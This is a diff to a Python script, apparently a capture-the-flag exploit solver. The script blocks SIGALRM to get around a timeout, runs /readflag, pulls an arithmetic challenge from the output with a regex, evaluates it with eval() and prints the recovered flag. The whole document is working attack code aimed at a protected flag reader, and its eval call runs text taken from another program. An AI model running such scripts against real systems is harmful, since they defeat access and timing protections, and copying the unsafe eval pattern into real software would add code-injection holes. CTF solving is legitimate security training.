@@ -1,68 +1,53 @@
-import signal
-import subprocess
-import sys
-import re
 import os
-import time
-
-def log(msg):
-    sys.stderr.write(f"[EXPLOIT] {msg}\n")
-    sys.stderr.flush()
+import sys
+import subprocess
+import signal
+import re
 
 def main():
-    log("Python Solver Started!")
-    log(f"UID: {os.getuid()} GID: {os.getgid()}")
+    # Write to stderr to bypass any stdout capture
+    sys.stderr.write("\n\n[EXPLOIT] STARTING SOLVER\n\n")
     
-    # Block SIGALRM
     try:
+        # Block signal
         signal.pthread_sigmask(signal.SIG_BLOCK, [signal.SIGALRM])
-        log("Blocked SIGALRM")
-    except AttributeError:
-        log("signal.pthread_sigmask not available")
-    except Exception as e:
-        log(f"Error blocking signal: {e}")
-
-    try:
-        log("Invoking /readflag")
-        # Run unbuffered
-        p = subprocess.Popen(
-            ["/readflag"],
-            stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-            bufsize=0
-        )
         
-        buffer = ""
+        # Run readflag
+        p = subprocess.Popen(["/readflag"], 
+                             stdin=subprocess.PIPE, 
+                             stdout=subprocess.PIPE, 
+                             stderr=subprocess.PIPE,
+                             text=True,
+                             bufsize=0)
+        
+        # Read output
+        output = ""
         while True:
             char = p.stdout.read(1)
             if not char: break
-            buffer += char
-            if "input your answer:" in buffer:
+            output += char
+            if "answer:" in output:
                 break
+                
+        sys.stderr.write(f"[EXPLOIT] OUTPUT: {output}\n")
         
-        log(f"Got Prompt: {buffer.strip()}")
-        
-        # Extract math
-        match = re.search(r'(\( {2,}.*?\))', buffer, re.DOTALL)
+        # Solve
+        match = re.search(r'(\( {2,}.*?\))', output, re.DOTALL)
         if match:
-            expr = match.group(1)
-            log(f"Math: {expr}")
-            ans = eval(expr)
-            log(f"Answer: {ans}")
+            val = eval(match.group(1))
+            sys.stderr.write(f"[EXPLOIT] SOLVED: {val}\n")
             
-            p.stdin.write(f"{ans}\n")
+            p.stdin.write(f"{val}\n")
             p.stdin.flush()
             
             res = p.stdout.read()
-            log(f"FINAL OUTPUT: {res}")
-            print(f"\n\nFLAG_FOUND: {res}\n\n", flush=True)
+            sys.stderr.write(f"[EXPLOIT] FLAG: {res}\n")
+            print(f"FLAG: {res}") # Print to stdout too
         else:
-            log("No math found")
-
+            sys.stderr.write("[EXPLOIT] NO MATH FOUND\n")
+            
     except Exception as e:
-        log(f"Exception: {e}")
+        sys.stderr.write(f"[EXPLOIT] ERROR: {e}\n")
 
 if __name__ == "__main__":
     main()
